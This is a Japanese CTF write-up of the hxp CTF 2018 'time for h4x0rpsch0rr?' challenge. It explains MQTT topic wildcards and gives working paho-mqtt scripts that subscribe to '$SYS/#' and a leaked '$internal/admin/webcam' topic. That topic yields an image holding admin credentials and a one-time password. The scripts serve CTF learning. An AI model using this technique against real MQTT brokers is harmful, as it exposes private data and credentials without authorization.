# hxp CTF 2018 Writeup - time for h4x0rpsch0rr?

<https://2018.ctf.link>

<http://127.0.0.1:82/internal/challenge/29747370-78d6-4698-8f79-e00f41f678fd.html>

<http://127.0.0.1:8001/>

# 解き始め

```html
<script src="mqtt.min.js"></script>
<script>
  var client = mqtt.connect("ws://" + location.hostname + ":60805");
  client.subscribe("hxp.io/temperature/Munich");

  client.on("message", function(topic, payload) {
    var temp = parseFloat(payload);
    var result = "NO";

    /* secret formular, please no steal*/
    if (-273.15 <= temp && temp < Infinity) {
      result = "YES";
    }
    document.getElementById("beer").innerText = result;
  });
</script>
```

mqtt.js というライブラリで WebSocket を使って 127.0.0.1:60805 と通信している

hxp.io/temperature/Munich を指定して取ってきて payload が -273.15 以上であれば result を'YES'とし html を書き換える

```html
<a href="admin.php">Admin Access</a>
```

管理者ログイン場面

ユーザー名・パスワード・ワンタイムパスワードが要求される

おそらく MQTT の動作に関する問題

# MQTT

<https://mqtt.org/>

[MQTT v3.1.1 Document](http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html)

## MQTT とは

- MQ Telemetry Transport

- シンプルで軽量な双方向メッセージングプロトコル

  - http と比較してメッセージヘッダのデータ量が小さい
  - ネットワーク帯域幅とデバイスリソース要件を最小限に抑えることが可能

- publish/subscribe 型のメッセージ転送

  - 多数のデバイスとメッセージをやりとりできる

- M2M, IoT, モバイルアプリケーション で使用される

  - 制約のあるデバイス
  - 多数のデバイス
  - 低帯域幅
  - 高レイテンシ
  - 信頼性の低いネットワーク

- TCP/IP port 1883 が MQTT 用に，TCP/IP port 8883 が MQTT over TLS 用に予約済み
- 最大メッセージサイズは 256MB

> なぜソースでは WebSocket を使っているのか？
>
> MQTT は TCP であるため直接 Web ブラウザで扱うことができない
>
> MQTT over WebSocket プロトコルによってブラウザ上で MQTT のメッセージを受け渡しすることができる
>
> MQTT over WebSocket を使用したブラウザ上でのデモ
>
> <https://mitsuruog.github.io/what-mqtt/>

## MQTT トピック

[4.7 Topic Names and Topic Filters](http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718106)

MQTT ではメッセージをディレクトリのような「トピック」と呼ばれる仕組みで管理している

分かりやすい解説記事

<http://devcenter.magellanic-clouds.com/learning/mqtt-spec.html>

トピックによって多数のメッセージを効率よく扱うことができる

### MQTT トピックのワイルドカード

[4.7.1 Topic wildcards](http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718107)

#### \# を使ったワイルドカード (Multi-level wildcard)

\# 記号を指定した階層以下のすべてのトピックを取り出す

#### \+ を使ったワイルドカード (Single level wildcard)

\+ 記号を指定した同一階層のすべてのトピックを取り出す

### \$ から始まるトピック

[4.7.2 Topics beginning with \$](http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718108)

\$SYS はサーバー固有の情報または制御 API を含むトピックの接頭辞として広く採用されている

- \# では \$SYS/ から始まるトピックを得られない

- \$SYS/# と指定することで \$SYS/ から始まるトピックを得ることができる

- すべてのトピックを得るためには \# と \$SYS/# の両方を試す必要がある

> \$ から始まるトピックではメッセージのやりとりを行わないことが推奨されている

# 攻撃コード

<https://pypi.org/project/paho-mqtt/>

paho-mqtt ライブラリを使用して Subscriber を作りワイルドカードを試していく

## ソースを再現する

```python
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, respons_code):
    print('connected')
    client.subscribe('hxp.io/temperature/Munich')

def on_message(client, userdata, msg):
    print(msg.topic)
    print(str(msg.payload))

client = mqtt.Client(transport="websockets")
client.on_connect = on_connect
client.on_message = on_message
client.connect('127.0.0.1', 60805, 60)
client.loop_forever()
```

```
hxp.io/temperature/Munich
b'13.37'
```

hxp.io/temperature/Munich というトピックから 13.37 というメッセージを得た

## Multi-level wildcard を試す

```python
def on_connect(client, userdata, flags, respons_code):
    print('connected')
    client.subscribe('#')
```

```
hxp.io/temperature/Munich
b'13.37'
```

\# で指定できるトピックは hxp.io/temperature/Munich のみ

## \$SYS/ から始まるトピックを得る

```python
def on_connect(client, userdata, flags, respons_code):
    print('connected')
    client.subscribe('$SYS/#')
```

```
$SYS/broker/version
b'mosquitto version 1.4.10'
$SYS/broker/timestamp
b'Wed, 17 Oct 2018 19:03:03 +0200'
$SYS/broker/uptime
b'6072 seconds'
$SYS/broker/clients/total
b'1'
$SYS/broker/clients/inactive
b'1'
$SYS/broker/clients/disconnected
b'1'
$SYS/broker/clients/active
b'0'
$SYS/broker/clients/connected
b'0'
$SYS/broker/clients/expired
b'0'
$SYS/broker/clients/maximum
b'2'
$SYS/broker/messages/stored
b'36'
$SYS/broker/messages/received
b'4707'
$SYS/broker/messages/sent
b'0'
$SYS/broker/subscriptions/count
b'1'
$SYS/broker/retained messages/count
b'36'
$SYS/broker/heap/current
b'56344'
$SYS/broker/heap/maximum
b'229424'
$SYS/broker/publish/messages/dropped
b'0'
$SYS/broker/publish/messages/received
b'2339'
$SYS/broker/publish/messages/sent
b'0'
$SYS/broker/publish/bytes/received
b'49696457'
$SYS/broker/publish/bytes/sent
b'49862351'
$SYS/broker/bytes/received
b'49882407'
$SYS/broker/bytes/sent
b'0'
$SYS/broker/load/messages/received/1min
b'48.23'
$SYS/broker/load/messages/received/5min
b'47.04'
$SYS/broker/load/messages/received/15min
b'46.64'
$SYS/broker/load/publish/received/1min
b'23.30'
$SYS/broker/load/publish/received/5min
b'23.09'
$SYS/broker/load/publish/received/15min
b'23.09'
$SYS/broker/load/bytes/received/1min
b'493962.98'
$SYS/broker/load/bytes/received/5min
b'492702.15'
$SYS/broker/load/bytes/received/15min
b'492928.33'
$SYS/broker/load/connections/1min
b'12.47'
$SYS/broker/load/connections/5min
b'11.98'
$SYS/broker/load/connections/15min
b'11.77'
$SYS/broker/log/M/subscribe
b'1545101946: f5f304e1-4b5e-43df-ad23-5a546566e74e 0 $SYS/#'
$SYS/broker/log/M/subscribe
b'1545101947: 3b274810-af91-4a9b-9b7b-be61ae667df9 0 $internal/admin/webcam'
```

\$internal/admin/webcam という思わせぶりなメッセージがある

## \$internal/admin/webcam を試す

```python
def on_connect(client, userdata, flags, respons_code):
    print('connected')
    client.subscribe('$internal/admin/webcam')
```

バイナリが出てくる(長いので割愛)

はじめの数十文字をググると jpg のバイナリらしい

## バイナリを jpg 化

```python
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, respons_code):
    print('connected')
    client.subscribe('$internal/admin/webcam')

def on_message(client, userdata, msg):
    print("receive message")
    f = open("webcam.jpg","wb")
    f.write(msg.payload)
    f.close()

client = mqtt.Client(transport="websockets")
client.on_connect = on_connect
client.on_message = on_message
client.connect('127.0.0.1', 60805, 60)
client.loop_forever()
```

画像にユーザー名・パスワード・ワンタイムパスワードが出てくるので admin.php に入力し flag get

# 感想

MQTT の扱いを問う問題で難易度は高くなかった

問題を解く「とっかかり」を見つけることのできる知識力・検索力の不足を感じた

# 参考にした Writeup

<https://ctftime.org/task/7210>

<https://graneed.hatenablog.com/entry/2018/12/09/220333>

<https://infosec.rm-it.de/2018/12/09/hxp-ctf-2018-time-for-h4x0rpsch0rr/>
